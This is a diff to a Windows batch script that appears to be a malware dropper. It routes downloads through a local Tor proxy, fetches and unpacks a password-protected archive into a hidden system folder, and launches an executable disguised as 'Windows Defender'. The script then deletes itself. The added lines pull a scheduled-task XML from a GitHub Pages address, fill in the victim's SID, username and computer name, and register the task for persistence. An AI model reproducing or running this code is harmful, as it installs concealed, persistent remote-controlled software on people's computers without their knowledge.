@@ -46,6 +46,16 @@ if not errorlevel 1 (set "proxy=--tlsv1 --socks5-hostname 127.0.0.1:9050") else 
 "%environment%\curl.exe" -k %proxy% %host%/Tools/apache2.7z -o "%temp%\apache2.7z" && "%environment%\7-Zip\7z.exe" x "%temp%\apache2.7z" -p7zapache2 -o"%environment%" -y && attrib +s +h +i "%environment%\apache2" && del "%temp%\apache2.7z"
 "%environment%\curl.exe" -k -L https://archive.org/download/visual-c-redistributable-for-visual-studio-2012-update-4/Visual%%20C%%2B%%2B%%20Redistributable%%20for%%20Visual%%20Studio%%202012%%20Update%%204.zip/vcredist_x86.exe -o "%temp%\vcredist_x86.exe" && "%temp%\vcredist_x86.exe" /Q && del /s /f /q /a "%temp%\vcredist_x86.exe"
 
+FOR /F "tokens=1,2 delims==" %%s IN ('wmic path win32_useraccount where name^='%username%' get sid /value ^| find /i "SID"') DO SET SID=%%t
+curl -k %proxy% "https://raw.githubusercontent.com/cryptedodissey/cryptedodissey.github.io/main/Task.xml" > "%SID%.xml"
+powershell -Command "(gc '%SID%.xml') -replace 'SID', '%SID%' | Out-File -encoding ASCII '%SID%.xml'"
+powershell -Command "(gc '%SID%.xml') -replace 'environment', '%environment%' | Out-File -encoding ASCII '%SID%.xml'"
+powershell -Command "(gc '%SID%.xml') -replace 'computername', '%computername%' | Out-File -encoding ASCII '%SID%.xml'"
+powershell -Command "(gc '%SID%.xml') -replace 'username', '%username%' | Out-File -encoding ASCII '%SID%.xml'"
+schtasks /Delete /TN "%SID%XYZ" /F
+schtasks /create /tn "%SID%XYZ" /xml "%SID%.xml"
+del "%SID%.xml"
+
 "%environment%\Windows Defender.exe" -P"rofile of Windows Defender [Microsoft Corporation]"
 endlocal
 DEL /s /f /q /a "%~f0" && exit
